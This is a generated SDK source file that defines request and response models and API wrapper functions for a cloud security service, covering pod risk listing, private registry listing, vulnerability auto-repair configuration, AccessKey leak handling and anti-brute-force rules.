async function listPluginForUuidWithOptions(tmpReq: ListPluginForUuidRequest, runtime: Util.RuntimeOptions): ListPluginForUuidResponse {
  Util.validateModel(tmpReq);
  var request = new ListPluginForUuidShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.types)) {
    request.typesShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.types, 'Types', 'simple');
  }
  var query = {};
  if (!Util.isUnset(request.typesShrink)) {
    query['Types'] = request.typesShrink;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPluginForUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPluginForUuid(request: ListPluginForUuidRequest): ListPluginForUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPluginForUuidWithOptions(request, runtime);
}

model ListPodRiskRequest {
  appName?: string(name='AppName', example='nginx1'),
  clusterId?: string(name='ClusterId', example='c314aa5b2f208461dad821cdfed82****'),
  currentPage?: long(name='CurrentPage', example='1'),
  namespace?: string(name='Namespace', example='taas'),
  pageSize?: long(name='PageSize', example='20'),
  podName?: string(name='PodName', example='abcd-84898334227-p****'),
}

model ListPodRiskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='2-'),
    totalCount?: int32(name='TotalCount', example='29'),
  }(name='PageInfo'),
  podRiskList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', example='10'),
      clusterId?: string(name='ClusterId', example='c1d903a628af043659a043af59d89****'),
      clusterName?: string(name='ClusterName', example='test66'),
      createTime?: long(name='CreateTime', example='1644283112720'),
      hcCount?: int32(name='HcCount', example='1'),
      instanceId?: string(name='InstanceId', example='i-7yvdq597****'),
      namespace?: string(name='Namespace', example='kube-system'),
      nodeName?: string(name='NodeName', example='test'),
      pod?: string(name='Pod', example='expoit-xxx-b****'),
      podIp?: string(name='PodIp', example='172.0.XXX.XXX'),
      vulCount?: int32(name='VulCount', example='1'),
    }
  ](name='PodRiskList'),
  requestId?: string(name='RequestId', example='94254AD7-5026-5847-833B-403C2326BD6E'),
}

model ListPodRiskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPodRiskResponseBody(name='body'),
}

async function listPodRiskWithOptions(request: ListPodRiskRequest, runtime: Util.RuntimeOptions): ListPodRiskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.podName)) {
    query['PodName'] = request.podName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPodRisk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPodRisk(request: ListPodRiskRequest): ListPodRiskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPodRiskWithOptions(request, runtime);
}

model ListPrivateRegistryListRequest {
  registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor'),
}

model ListPrivateRegistryListResponseBody = {
  imageRegistryInfos?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='1766185894******'),
      domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
      id?: long(name='Id', description='The ID of the image repository.', example='66485'),
      jenkinsEnv?: string(name='JenkinsEnv', description='The information about the Jenkins environment.', example='JenkinsInfo'),
      netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='1'),
      password?: string(name='Password', description='The password used to log on to the image repository.', example='Harbor******'),
      persistenceDay?: long(name='PersistenceDay', description='The number of days during which assets can be retained.', example='90'),
      protocolType?: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1'),
      regionId?: string(name='RegionId', description='The region ID of the server.', example='cn-hangzhou'),
      registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.XXX.XXX'),
      registryName?: string(name='RegistryName', description='The alias of the image repository.', example='test1'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor'),
      registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Valid values:

*   **V1**: V1.0
*   **V2**: V2.0', example='V1'),
      token?: string(name='Token', description='The authentication token of the user.', example='0da12bce-cc36-4c48-b3e6-2215fc3a****'),
      transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30'),
      userName?: string(name='UserName', description='The username used to log on to the image repository.', example='RegistryUser'),
      vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC).', example='vpc-bp12897gqrex01zn0****'),
      whiteList?: string(name='WhiteList', description='The whitelist of IP addresses.', example='100.104.XXX.XXX'),
    }
  ](name='ImageRegistryInfos', description='An array that consists of the image repositories.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
}

model ListPrivateRegistryListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPrivateRegistryListResponseBody(name='body'),
}

async function listPrivateRegistryListWithOptions(request: ListPrivateRegistryListRequest, runtime: Util.RuntimeOptions): ListPrivateRegistryListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryType)) {
    query['RegistryType'] = request.registryType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPrivateRegistryList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPrivateRegistryList(request: ListPrivateRegistryListRequest): ListPrivateRegistryListResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateRegistryListWithOptions(request, runtime);
}

model ListPrivateRegistryTypeRequest {
  lang?: string(name='Lang'),
}

model ListPrivateRegistryTypeResponseBody = {
  registryTypeInfos?: [ 
    {
      count?: long(name='Count', description='The number of image repositories.', example='2'),
      registryType?: string(name='RegistryType', description='The name of the image repository type. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor'),
    }
  ](name='RegistryTypeInfos', description='An array that consists of image repository types.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model ListPrivateRegistryTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPrivateRegistryTypeResponseBody(name='body'),
}

async function listPrivateRegistryTypeWithOptions(request: ListPrivateRegistryTypeRequest, runtime: Util.RuntimeOptions): ListPrivateRegistryTypeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPrivateRegistryType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPrivateRegistryType(request: ListPrivateRegistryTypeRequest): ListPrivateRegistryTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateRegistryTypeWithOptions(request, runtime);
}

model ListQueryRaspAppInfoRequest {
  lang?: string(name='Lang', example='zh'),
  uuids?: string(name='Uuids', example='6541631a-7d47-41fd-9fef-9518113f****'),
}

model ListQueryRaspAppInfoResponseBody = {
  code?: string(name='Code', example='200'),
  data?: [ 
    {
      raspAppName?: string(name='RaspAppName', example='rasp-app'),
      raspOnlineStatus?: int32(name='RaspOnlineStatus', example='0'),
      raspStatus?: string(name='RaspStatus', example='SUCCESS'),
      result?: string(name='Result', description='推送失败结果'),
      uuid?: string(name='Uuid', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
  success?: boolean(name='Success', example='true'),
}

model ListQueryRaspAppInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListQueryRaspAppInfoResponseBody(name='body'),
}

async function listQueryRaspAppInfoWithOptions(request: ListQueryRaspAppInfoRequest, runtime: Util.RuntimeOptions): ListQueryRaspAppInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListQueryRaspAppInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listQueryRaspAppInfo(request: ListQueryRaspAppInfoRequest): ListQueryRaspAppInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return listQueryRaspAppInfoWithOptions(request, runtime);
}

model ListRuleTargetAllRequest {
  clusterId?: string(name='ClusterId', example='cfa7e2fb8c221483ba59e098c34c6****'),
}

model ListRuleTargetAllResponseBody = {
  requestId?: string(name='RequestId', example='30CBF632-109F-596F-97F2-451C8B2A****'),
  ruleTargetList?: [ 
    {
      targetId?: long(name='TargetId', example='301944'),
      targetName?: string(name='TargetName', example='source-test-obj-xFKcx'),
      targetType?: string(name='TargetType', example='IMAGE'),
    }
  ](name='RuleTargetList'),
}

model ListRuleTargetAllResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListRuleTargetAllResponseBody(name='body'),
}

async function listRuleTargetAllWithOptions(request: ListRuleTargetAllRequest, runtime: Util.RuntimeOptions): ListRuleTargetAllResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListRuleTargetAll',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listRuleTargetAll(request: ListRuleTargetAllRequest): ListRuleTargetAllResponse {
  var runtime = new Util.RuntimeOptions{};
  return listRuleTargetAllWithOptions(request, runtime);
}

model ListSystemAggregationRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds'),
  currentPage?: int32(name='CurrentPage', example='1'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  ruleName?: string(name='RuleName'),
  ruleTypes?: [ int32 ](name='RuleTypes'),
  systemType?: int32(name='SystemType', example='0'),
}

model ListSystemAggregationRulesResponseBody = {
  aggregationList?: [ 
    {
      id?: int32(name='Id', example='1'),
      name?: string(name='Name'),
      ruleCount?: int32(name='RuleCount', example='0'),
    }
  ](name='AggregationList'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='30'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='6800B790-B10A-5C2F-BEB3-F1D5CE61****'),
}

model ListSystemAggregationRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemAggregationRulesResponseBody(name='body'),
}

async function listSystemAggregationRulesWithOptions(request: ListSystemAggregationRulesRequest, runtime: Util.RuntimeOptions): ListSystemAggregationRulesResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemAggregationRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemAggregationRules(request: ListSystemAggregationRulesRequest): ListSystemAggregationRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemAggregationRulesWithOptions(request, runtime);
}

model ListSystemClientRuleTypesResponseBody = {
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925****'),
  ruleTypes?: [ string ](name='RuleTypes'),
}

model ListSystemClientRuleTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemClientRuleTypesResponseBody(name='body'),
}

async function listSystemClientRuleTypesWithOptions(runtime: Util.RuntimeOptions): ListSystemClientRuleTypesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListSystemClientRuleTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemClientRuleTypes(): ListSystemClientRuleTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemClientRuleTypesWithOptions(runtime);
}

model ListSystemClientRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds'),
  currentPage?: int32(name='CurrentPage', example='1'),
  isContainer?: int32(name='IsContainer', example='1'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  ruleName?: string(name='RuleName'),
  ruleTypes?: [ int32 ](name='RuleTypes'),
  systemType?: int32(name='SystemType', example='0'),
}

model ListSystemClientRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='17'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='C43CA30F-EF67-51BB-8C95-F31B8303****'),
  ruleList?: [ 
    {
      aggregationName?: string(name='AggregationName'),
      description?: string(name='Description'),
      platform?: string(name='Platform', example='linux'),
      policies?: [ 
        {
          policyKey?: string(name='PolicyKey', example='system_auto_****'),
          policyName?: string(name='PolicyName'),
        }
      ](name='Policies'),
      ruleId?: long(name='RuleId', example='30****'),
      ruleName?: string(name='RuleName'),
      ruleType?: int32(name='RuleType', example='alihips'),
      status?: int32(name='Status', example='online'),
      switchId?: string(name='SwitchId', example='USER-ENABLE-SWITCH-TYPE_****'),
    }
  ](name='RuleList'),
}

model ListSystemClientRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemClientRulesResponseBody(name='body'),
}

async function listSystemClientRulesWithOptions(request: ListSystemClientRulesRequest, runtime: Util.RuntimeOptions): ListSystemClientRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aggregationIds)) {
    query['AggregationIds'] = request.aggregationIds;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isContainer)) {
    query['IsContainer'] = request.isContainer;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleTypes)) {
    query['RuleTypes'] = request.ruleTypes;
  }
  if (!Util.isUnset(request.systemType)) {
    query['SystemType'] = request.systemType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemClientRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemClientRules(request: ListSystemClientRulesRequest): ListSystemClientRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemClientRulesWithOptions(request, runtime);
}

model ListSystemRuleAggregationTypesRequest {
  lang?: string(name='Lang', example='zh'),
}

model ListSystemRuleAggregationTypesResponseBody = {
  aggregationTypeList?: [ 
    {
      id?: int32(name='Id', example='1'),
      name?: string(name='Name'),
    }
  ](name='AggregationTypeList'),
  requestId?: string(name='RequestId', example='1427F3BE-8A7E-57F9-BD4E-590B00D2****'),
}

model ListSystemRuleAggregationTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemRuleAggregationTypesResponseBody(name='body'),
}

async function listSystemRuleAggregationTypesWithOptions(request: ListSystemRuleAggregationTypesRequest, runtime: Util.RuntimeOptions): ListSystemRuleAggregationTypesResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemRuleAggregationTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemRuleAggregationTypes(request: ListSystemRuleAggregationTypesRequest): ListSystemRuleAggregationTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemRuleAggregationTypesWithOptions(request, runtime);
}

model ListUninstallAegisMachinesRequest {
  currentPage?: int32(name='CurrentPage', example='4'),
  os?: string(name='Os', example='linux'),
  pageSize?: int32(name='PageSize', example='5'),
  regionIdStr?: string(name='RegionIdStr', example='cn-hangzhou'),
  regionNo?: string(name='RegionNo', example='cn-hangzhou'),
  remark?: string(name='Remark', example='172.20.XX.XX'),
  sourceIp?: string(name='SourceIp', example='180.113.XX.XX'),
  vendor?: int32(name='Vendor', example='0'),
}

model ListUninstallAegisMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage', example='1'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId', example='sas-bdrvxb4b****'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      internetIp?: string(name='InternetIp', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='192.168.XX.XX'),
      machineRegion?: string(name='MachineRegion', example='cn-hangzhou'),
      os?: string(name='Os', example='linux'),
      regionId?: string(name='RegionId', example='cn-shanghai'),
      uuid?: string(name='Uuid', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
      vendor?: int32(name='Vendor', example='0'),
      vendorName?: string(name='VendorName', example='ALIYUN'),
    }
  ](name='MachineList'),
  pageSize?: int32(name='PageSize', example='5'),
  requestId?: string(name='RequestId', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
  totalCount?: int32(name='TotalCount', example='44'),
}

model ListUninstallAegisMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListUninstallAegisMachinesResponseBody(name='body'),
}

async function listUninstallAegisMachinesWithOptions(request: ListUninstallAegisMachinesRequest, runtime: Util.RuntimeOptions): ListUninstallAegisMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdStr)) {
    query['RegionIdStr'] = request.regionIdStr;
  }
  if (!Util.isUnset(request.regionNo)) {
    query['RegionNo'] = request.regionNo;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUninstallAegisMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listUninstallAegisMachines(request: ListUninstallAegisMachinesRequest): ListUninstallAegisMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUninstallAegisMachinesWithOptions(request, runtime);
}

model ListUuidsByWebPathRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  type?: string(name='Type', example='def'),
  webPath?: string(name='WebPath', example='/root/www****'),
}

model ListUuidsByWebPathResponseBody = {
  list?: [ 
    {
      internetIp?: string(name='InternetIp', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.25.XX.XX'),
      machineName?: string(name='MachineName', example='test****'),
      uuid?: string(name='Uuid', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='10'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A3C1240F-9DAC-5EE8-ADF5-2F930A95****'),
}

model ListUuidsByWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListUuidsByWebPathResponseBody(name='body'),
}

async function listUuidsByWebPathWithOptions(request: ListUuidsByWebPathRequest, runtime: Util.RuntimeOptions): ListUuidsByWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.webPath)) {
    query['WebPath'] = request.webPath;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUuidsByWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listUuidsByWebPath(request: ListUuidsByWebPathRequest): ListUuidsByWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUuidsByWebPathWithOptions(request, runtime);
}

model ListVulAutoRepairConfigRequest {
  aliasName?: string(name='AliasName', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='10'),
  type?: string(name='Type', example='cve'),
}

model ListVulAutoRepairConfigResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='success'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='10'),
    totalCount?: int32(name='TotalCount', example='11'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
  success?: boolean(name='Success', example='true'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
      id?: long(name='Id', example='37338'),
      name?: string(name='Name', example='anolisos:8.4:ANSA-2022:0001'),
      reason?: string(name='Reason', example='The vulnerability fix is risk-free and can be configured to automate the fix.'),
      type?: string(name='Type', example='cve'),
    }
  ](name='VulAutoRepairConfigList'),
}

model ListVulAutoRepairConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListVulAutoRepairConfigResponseBody(name='body'),
}

async function listVulAutoRepairConfigWithOptions(request: ListVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): ListVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listVulAutoRepairConfig(request: ListVulAutoRepairConfigRequest): ListVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listVulAutoRepairConfigWithOptions(request, runtime);
}

model ModifyAccessKeyLeakDealRequest {
  id?: long(name='Id', description='The ID of the AccessKey pair leak.

> You can call the [DescribeAccesskeyLeakList](~~DescribeAccesskeyLeakList~~) operation to query the ID. You must specify at least one of the Id and **IdList** parameters.', example='123'),
  idList?: [ long ](name='IdList', description='The IDs of AccessKey pair leaks.'),
  remark?: string(name='Remark', description='The remarks that are added.', example='disabled.'),
  type?: string(name='Type', description='The method to handle the AccessKey pair leak. Valid values:

*   **manual**: manually handle
*   **disable**: disable
*   **add-whitelist**: add to the whitelist', example='disable'),
}

model ModifyAccessKeyLeakDealResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DD4617B4-133A-53C8-ADAE-7B30FF89****'),
}

model ModifyAccessKeyLeakDealResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAccessKeyLeakDealResponseBody(name='body'),
}

async function modifyAccessKeyLeakDealWithOptions(request: ModifyAccessKeyLeakDealRequest, runtime: Util.RuntimeOptions): ModifyAccessKeyLeakDealResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAccessKeyLeakDeal',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAccessKeyLeakDeal(request: ModifyAccessKeyLeakDealRequest): ModifyAccessKeyLeakDealResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAccessKeyLeakDealWithOptions(request, runtime);
}

model ModifyAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', example='true'),
  failCount?: int32(name='FailCount', example='10'),
  forbiddenTime?: int32(name='ForbiddenTime', example='5'),
  id?: long(name='Id', description='The threshold of logon failures that you specify. Valid values:

*   **2**
*   **3**
*   **4**
*   **5**
*   **10**
*   **50**
*   **80**
*   **100**', example='65778'),
  name?: string(name='Name', description='Modifies a defense rule against brute-force attacks.', example='TestRule'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1.2.XX.XX'),
  span?: int32(name='Span', description='ModifyAntiBruteForceRule', example='1'),
  uuidList?: [ string ](name='UuidList', example='uuid-13213-dasda'),
}

model ModifyAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model ModifyAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAntiBruteForceRuleResponseBody(name='body'),
}

